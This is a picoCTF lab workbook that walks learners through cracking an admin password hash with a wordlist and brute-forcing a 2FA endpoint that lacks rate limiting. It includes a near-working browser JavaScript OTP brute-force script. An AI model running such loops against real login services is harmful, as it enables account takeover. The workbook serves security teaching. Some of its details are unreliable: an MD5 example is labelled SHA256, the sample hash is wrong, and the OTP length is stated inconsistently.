# CTF Workbook: No FA

 **Platform:** picoCTF 2026
 **Category:** Web
 **Difficulty:** Beginner → Intermediate
 **Suggested duration:** 60–90 minutes
 **Source:** https://learn.cylabacademy.org/library/765?page=1&category=1&difficulty=2

---

# Challenge: No FA

## Learning objectives

 By the end of this challenge, you should be able to:

- Read application source code looking for security vulnerabilities.
- Recognize why unsalted password hashes are dangerous.
- Understand the difference between hashing and encryption.
- Use a password-cracking tool against a hash in a controlled CTF environment.
- Understand how two-factor authentication using a one-time password (OTP) works.
- Recognize why an OTP endpoint needs rate limiting.
- Use your browser's developer tools to inspect HTTP requests.
- Automate repetitive requests against a deliberately vulnerable CTF service.
- Explain how the two vulnerabilities can be chained together.

---

## Before you start

You will need:

- A browser.

- Access to the picoCTF challenge instance.

- A Linux terminal.

- Basic familiarity with Python or JavaScript is helpful, but not required.

- A hash cracking tool such as hashcat or [HashReaper](https://github.com/HarshithSaini/HashReaper) (the latter is easier to set up)

- A wordlist such [rockyou.txt](https://github.com/zacheller/rockyou/blob/master/rockyou.txt.tar.gz)

Usefeul browser tools:

- **Developer Tools** — usually opened with `F12`, `Ctrl+Shift+I`, or `Cmd+Option+I`.

- **Console** — lets you execute JavaScript in the browser.

- **Network tab** — shows HTTP requests made by the web application.
  
  If you are completely new to web CTFs, don't worry if terms such as _HTTP request_, _POST_, _JSON_, or _hash_ are unfamiliar. Explanations are included throughout the workbook.

---

# Part 1: Explore the challenge

 Start the challenge instance by navigating the source url given at the top of this file and click on the "Launch Instance" button.

Follow the instructions that show up after you click the button. 

Spend a few minutes inspecting the provided source code (app.py) and navigating the website normally before looking for vulnerabilities.

### Questions

1. What pages can you access without logging in?

2. Is there a login page?

3. Can you find a registration page?

4. What information does the login form request?

5. Does the application appear to have two-factor authentication?
   
   Write down anything interesting you notice.

```
Observations:

____________________________________________________________

____________________________________________________________

____________________________________________________________
```

If you can't find the answer to a question, just skip it for now..

---

## Beginner help: What are we looking for?

 A web CTF often works like this:

```
Browser
   |
   | HTTP request
   v
Web application
   |
   +--> Database
   |
   +--> Authentication
   |
   +--> Other application functionality
```

 Our goal isn't necessarily to find a complicated bug.

 Instead, ask:

> "What assumptions did the developer make that might not be safe?"

 Common things to look for include:

- Passwords stored incorrectly.
- Missing authorization checks.
- Secrets in source code.
- Predictable tokens.
- Missing input validation.
- Debug functionality.
- Unlimited login attempts.
- Unlimited OTP attempts.

---

# Part 2: Inspect the application closer

## Look at the source

 Many CTF web challenges intentionally provide enough information in the application to reveal how it works.

 Look at the available source code supplied by the challenge.

### Your task

 Find where the application:

1. Stores user accounts.
   
   2. Stores passwords or password hashes.
   3. Checks a password during login.
   4. Generates or checks the OTP.
   5. Processes an OTP submitted by the user.
   
   Don't worry about understanding every line.
   
   Instead, search for interesting words such as:

```
password
hash
login
admin
otp
two_fa
2fa
verify
database
db
```

### Questions

- Can you find a list of users or a database?

- Is there an `admin` account?

- How are passwords stored?

- How is the OTP checked?
  
  Record your findings:

```
Interesting username:

____________________________________________________________

Password storage:

____________________________________________________________

OTP verification:

____________________________________________________________
```

---

# Part 3: Understand password hashing

 You may encounter something resembling:

```
password -> hash function -> stored hash
```

 For example:

```
if MD5(password) == user['password']:
    // authenticate user
```

In the above exmaple, SHA256 is the cryptographic hash function.
A hash function is designed to be one-way function that takes an input and scrambles it.

For example:

```
MD5("hello") = "8b1a9953c4611296a827abf8c47804d7"
```

This means that, normally, there is no way to trace that the value "8b1a9953c..." corresponds to the word "hello".

This is different than an encryption function. With encryption, the output data is meant to be reversed to the original output. But this topic is for another challenge.

To learn what the value "8b1a9953c..." corresponds to before hashing, the attacker needs to try candidate passwords and see if the results match:

```
"password123" -> hash -> compare result against the hash
"letmein"     -> hash -> compare result against the hash
"apple123"    -> hash -> compare result against the hash
...
```

If a candidate produces the same hash, the candidate password has been discovered.

As a side note, the result of the function MD5(input) is always the same as long as input is the same.

---

## Why is a salt important?

Besides providing taste to our food, it provides security to password hashes :-)

Consider two users:

```
Alice: password = summer2026
Bob:   password = summer2026
```

 If the application stores an unsalted hash, everyone who uses the same password has the same hash.

 With a unique random salt appended to the password:

```
Alice:
summer2026 + "some_random_salt_a" -> hash A

Bob:
summer2026 + "some_random_salt_b" -> hash B
```

 The resulting hashes are different.

 Salts make attacks involving rainbow tables (a precomputed list of password-hash pairs) substantially hard to work with.

---

# Part 4: Find the interesting account

 Inspect the application's source code.

 Look for an account that is particularly interesting from an authentication perspective.

### Questions

- Which account appears to give access to the flag?

```
Username:
```

---

# Part 5: Understand the Leak

Download users.db if you haven't already.

Identify what type of file it is.

### Questions:

What is this file?

```

```

How do you open it so that you can "easily" read what is inside?

```

```

What is the most data in this file? (remember the user account you identified previously)

```

```

# Part 5 1/2

You should now have found a list of username and hash values such as:

```
john.doe: 599a4410e2af69d1585f16d82d4b5f0abf3ad09fa42b9d55d7b7a50671ccf8c1
```

But we don't know which hash function was used to compute these hashes.

Luckily, hashes often provide clues about which function was used. Can you identify which function was used?

> Answer:

### Beginner tip

 A useful first question is:

> "How long is the hash, and does it have a recognizable prefix or format?"

 You can use hash-identification tools.

 For example, [hashes.com](https://hashes.com/en/tools/hash_identifier) has a nice web UI that lets you identify hashing algorithms.

> Note: When you find the hash of a real person's password, it is not okay to paste it to online websites because you don't know what they are doing with the data.

---

# Part 6: Crack the password

 Your goal is to recover the password associated with the interesting account.

 For this, you need to use a hash cracking tool like Hashcat or HashReaper.

 If you are using Hashcat, first create a small text file containing the hash:

```
echo 'YOUR_HASH_HERE' > hash.txt
```

 Replace `YOUR_HASH_HERE` with the hash you discovered.

 You can then use an appropriate Hashcat mode and a wordlist.

 For example, a common workflow is:

```
hashcat -m <hash_type> hash.txt <your_wordlist.txt>
```

Or if you're using hashreaper, simply run:

```bash
bash python hashreaper.py <paste_hash_here> -t <hash_type> -w <your_wordlist.txt>
```

### Important

 You need to determine the correct `hash_type` from the actual hash format used by the challenge.

 Do not blindly copy a mode from an example on the internet.

---

## Beginner help: What is a wordlist?

 A wordlist is simply a file containing candidate passwords:

```
password
password123
letmein
qwerty
...
```

 A password cracker hashes each candidate and compares the result with the target hash.

 Conceptually:

```
candidate password
       |
       v
   hash function
       |
       v
candidate hash
       |
       v
compare with target hash
```

 If they match:

```
PASSWORD FOUND
```

`rockyou.txt` is a very commonly used wordlist in CTFs. You can find it if you search for it on your search engine.

---

## Checkpoint

 What password did you recover?

```
Recovered password:

____________________________________________________________
```

 Don't continue until you can successfully authenticate with the discovered username and password.

---

# Part 7: Log in

 Use the credentials you discovered to log into the application.

 You should reach another authentication step involving a one-time password.

### Questions

- What does the page ask you to enter?
  
  - How many digits does the OTP contain?
  - Does the page explain how many attempts you are allowed?
  - What happens when you enter an incorrect OTP?
  
  Record your observations:

```
OTP length:

____________________________________________________________

Incorrect OTP response:

____________________________________________________________

Number of failed attempts allowed:

____________________________________________________________
```

---

# Part 8: Understand OTPs

 A six-digit OTP has this general format:

```
000000
000001
000002
...
999998
999999
```

 That means there are:

```
1,000,000
```

 possible six-digit values.

 Normally, this is safe enough because an attacker should not be allowed to try all of them.

 A secure application might enforce rules such as:

```
Too many attempts
       |
       v
Temporary lockout
```

 or:

```
Attempt 1
Attempt 2
Attempt 3
       |
       v
Rate limit
       |
       v
Try again later
```

---

# Part 9: Look for rate limiting

 Now test the OTP mechanism carefully.

 Submit several incorrect OTPs.

 Use the browser's **Network** tab to observe what happens.

 You should see requests similar to:

```
POST /two_fa
```

 with request data resembling:

```
otp=123456
```

### Questions

1. What HTTP endpoint receives the OTP?
   
   2. Is the request a `GET` or `POST` request?
   3. What data is sent to the server?
   4. What does the server return when the OTP is wrong?
   5. Does the application stop you after several failures?
   
   Record what you find:

```
OTP endpoint:

____________________________________________________________

HTTP method:

____________________________________________________________

Request body:

____________________________________________________________

Failure response:

____________________________________________________________
```

---

# Part 10: Inspect the vulnerable code

 Notice this code in the app.py:

```python
@app.route('/two_fa', methods=['GET', 'POST'])
def two_fa():
    if request.method == 'POST':
        otp = request.form['otp']
        stored_otp = session['otp_secret']
        timestamp = session.get('otp_timestamp')
        if stored_otp and otp == stored_otp and (time.time() - timestamp) < 120:
            session['logged'] = 'true'
            flash('Login successful!', 'green')
            return redirect(url_for('home'))
        else:
            flash('Invalid OTP or OTP expired', 'red')
            return render_template('2fa.html')
    else:
        return render_template('2fa.html')
```

 Notice something important.

 There is no:

```
attempt counter
```

 There is no:

```
temporary lockout
```

 There is no:

```
rate limit
```

 There is no:

```
delay after failed attempts
```

 The application simply checks if the correct code was entered in 120 seconds .

 But an attacker may be able to try thousands of codes within that period.

---

# Part 11: Automate repetitive work

 Trying OTP values manually would be extremely tedious.

 This is where scripting becomes useful.

 The challenge can be solved by automating requests to the deliberately vulnerable endpoint.

 Open the browser's developer console, this helps us automate the repetition using Javascript.

 A simple JavaScript loop can generate six-digit values:

```
for (let i = 0; i <= 999999; i++) {
    let otp = String(i).padStart(6, '0');

    // send the OTP to the challenge using fetch()
}
```

 Let's understand this before using it.

### `String(i)`

 Converts a number to text.

```
String(42)
```

 produces:

```
"42"
```

### `.padStart(6, '0')`

 Makes the value six characters long.

 For example:

```
String(42).padStart(6, '0')
```

 produces:

```
"000042"
```

 This matters because:

```
42
```

 is not the same representation as:

```
000042
```

 for a six-digit OTP.

**Modify the below code so that it works with the OTP value that the website uses**

```
for (let i = 0; i <= WHAT_SHOULD_YOU_PUT_HERE?; i++) {
    let otp = String(i).padStart(WHAT_SHOULD_YOU_PUT_HERE?, '0');

    // send the OTP to the challenge using fetch()
}
```

<details>
  9999 and 6
</details>

---

# Part 12: Understand `fetch()`

 JavaScript's `fetch()` function can send an HTTP request.

 A simplified example:

```
let response = await fetch('/verify-otp', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'otp=123456&action='
});
```

 Break that down:

```
fetch()
   |
   +-- URL: /verify-otp
   |
   +-- method: POST
   |
   +-- Content-Type: x-www-form-urlencoded (do not worry about this for now)
   |
   +-- body: otp=123456&action=
```

---

# Part 13: Write the Exploit

## Challenge for Beginners (scroll down further for an advanced challenge)

 Fill in the missing pieces (there are 2 of them):

```javascript
async function bruteForceOTP(controller) {
    const batchSize = 200;

    const otps = Array.from({ length: 10000 }, (_, i) =>
        String(i).padStart(4, "0")
    );

    try {
        for (let i = 0; i < otps.length; i += batchSize) {
            if (controller.signal.aborted) return;

            const batch = otps.slice(i, i + batchSize);

            const results = await Promise.allSettled(
                batch.map(async otp => {
                    console.log(`Tried: ${otp}`);

                    const response = await fetch("__________?__________", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/x-www-form-urlencoded"
                        },
                        body: `otp=${encodeURIComponent(otp)}&action=`,
                        signal: controller.signal
                    });

                    return {
                        otp,
                        text: await response.text()
                    };
                })
            );

            for (const result of results) {
                if (result.status === "fulfilled" && !result.value.text.includes("Invalid")) {
                    console.log("OTP found:", result.value.otp);
                    controller.abort();
                    return;
                }
            }
        }

        console.log("OTP not found.");
    } catch (error) {
        if (error.name === "AbortError") {
            console.log("Old OTP loop stopped.");
        } else {
            console.error(error);
        }
    }
}

async function start() {
    let controller = new AbortController();

    bruteForceOTP(controller);

    setTimeout(async () => {
        console.log("120 seconds expired.");

        controller.abort();

        let password = "__________?__________";
        const response = await fetch("/login", {
            method: "POST",
            credentials: "include",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: `username=admin&password=${encodeURIComponent(password)}&action=`
        });

        console.log("Login status:", response.status);
        console.log("Redirected:", response.redirected);
        console.log("Final URL:", response.url);

        if (!response.redirected) {
            console.log("Login failed, not starting OTP loop.");
            return;
        }


        controller = new AbortController();
        console.log("Starting new OTP loop...");
        bruteForceOTP(controller);
    }, 120000);
}

start();
```

---

## A Harder Challenge

Create the automation code that:

1. Generates every possible 4-digit OTP (the OTP values have 4 digits in the challenge)
   
   2. Sends each OTP to the verification endpoint.
   3. Tries another OTP if the server reports failure
   4. Prints the successful OTP.
   5. Stops trying further values.

Make sure that:

1. You are not overloading the server

2. Optimizing your code so that it tries as many possibilities within the provided time

3. Removing as much manual work as possible

4. Accounting for the otp expiry window

5. Displaying the OTP upon success so that you can fill it in to log in (you can also change your cookie and session state if you're fancy)



You can use any programming language you want.

---

# Part 14: Run the exploit

 Once you write the code, run your completed version against the CTF challenge using the Javascript console. But make sure that you enter the correct password on the login page first.

Keep in mind that the exploit might take a lot of time depending on your luck. But you should only worry about this if you wrote your own exploit. In this case, try adding debugging code and look for further optimizations.

If you filled in the provided template instead of writing your own exploit, it will find the correct OTP eventually. If it can't find it in 15 minutes, first of all you're very unlucky, second of all you need to restart the session.

Either case, if you can't reach the website, you might need to relaunch the instance.

 Wait for the exploit to finish executing and show you the correct OTP code like "OTP Found: 1234".

Once it displays the code, **enter it on the website** as the provided exploit template does not log you in automatically.

### Questions

- Approximately how many guesses were required?
  
  - What response indicates success?
  - What happens to the browser session after successful authentication?
  - Where is the flag displayed?
  
  Record your result:

```
Successful OTP:

____________________________________________________________

Flag:

____________________________________________________________
```

---

# Part 15: Think like a defender

 You have now exploited two different weaknesses.

## Vulnerability 1: Password storage

 The application stored a password hash in an insecure way.

 The problem is not that hashing itself is bad.

 The problem is using a password-hashing design that lacks an appropriate unique salt and password-hardening mechanism.

 Modern applications should use password-hashing algorithms designed specifically for passwords, such as:

- Argon2
- bcrypt
- scrypt

---

## Vulnerability 2: Unlimited OTP attempts

 The OTP was protected only by its secrecy.

 The application did not sufficiently restrict attempts.

 A six-digit OTP has one million possible values:

```
10^6 = 1,000,000
```

 If an attacker can make large numbers of attempts automatically, the search space becomes manageable.

 A secure application should consider:

- Rate limiting.
- Attempt limits.
- Temporary lockouts.
- Monitoring and alerting.
- Appropriate OTP expiration.
- Binding authentication attempts to a session or user.
- Additional protections against automation.

---

# Final challenge questions

 Answer these without looking back through the workbook.

### Question 1

 Why didn't we "decrypt" the password hash?

```
Answer:

____________________________________________________________

____________________________________________________________
```

### Question 2

 Why does a salt make password cracking harder?

```
Answer:

____________________________________________________________

____________________________________________________________
```

### Question 3

 How many possible six-digit OTPs exist?

```
Answer:

____________________________________________________________
```

### Question 4

 What was the missing security control that made the OTP brute-force attack possible?

```
Answer:

____________________________________________________________
```

### Question 5

 Why are the two vulnerabilities particularly useful when combined?

```
Answer:

____________________________________________________________

____________________________________________________________
```

# Optional Challenge: Design a fix

 Imagine you are the developer.

Change the code to implement a safer OTP verification system and ask others if they can see something you missed. (There is actually a second vulnerability in this codebase related to the bruteforcing of the OTP value. Could you find it and fix it?)

# Further Reading

* Salt vs Pepper in cybersecurity

* Password reset token flaws

* Insufficient randomness when generating OTP values
